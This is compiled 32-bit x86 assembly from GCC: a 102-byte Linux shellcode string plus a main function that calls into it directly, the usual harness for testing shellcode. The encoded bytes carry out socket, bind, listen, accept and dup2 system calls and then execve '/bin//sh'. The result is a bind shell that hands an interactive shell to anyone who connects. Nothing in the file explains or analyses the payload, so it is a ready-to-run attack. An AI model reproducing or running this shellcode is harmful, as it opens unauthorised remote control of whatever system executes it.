	.file	"processed.c"
	.text
	.globl	sc
	.data
	.align 32
	.type	sc, @object
	.size	sc, 102
sc:
	.string	"1\3001\3331\322Pj\001j\002\211\341\376\303\260f\315\200\211\306Rh\273\002\273\273\211\341j\020QV\211\341\376\303\260f\315\200RV\211\341\263\004\260f\315\200RRV\211\341\376\303\260f\315\200\211\3031\311\260?\315\200A\260?\315\200A\260?\315\200Rh//shh/bin\211\343RS\211\341\260\013\315\200"
	.text
	.globl	main
	.type	main, @function
main:
.LFB0:
	.cfi_startproc
	leal	4(%esp), %ecx
	.cfi_def_cfa 1, 0
	andl	$-16, %esp
	pushl	-4(%ecx)
	pushl	%ebp
	.cfi_escape 0x10,0x5,0x2,0x75,0
	movl	%esp, %ebp
	pushl	%ecx
	.cfi_escape 0xf,0x3,0x75,0x7c,0x6
	subl	$20, %esp
	movl	$sc, -12(%ebp)
	movl	-12(%ebp), %eax
	call	*%eax
	movl	$0, %eax
	addl	$20, %esp
	popl	%ecx
	.cfi_restore 1
	.cfi_def_cfa 1, 0
	popl	%ebp
	.cfi_restore 5
	leal	-4(%ecx), %esp
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
.LFE0:
	.size	main, .-main
	.ident	"GCC: (GNU) 7.3.1 20180712 (Red Hat 7.3.1-6)"
	.section	.note.GNU-stack,"",@progbits
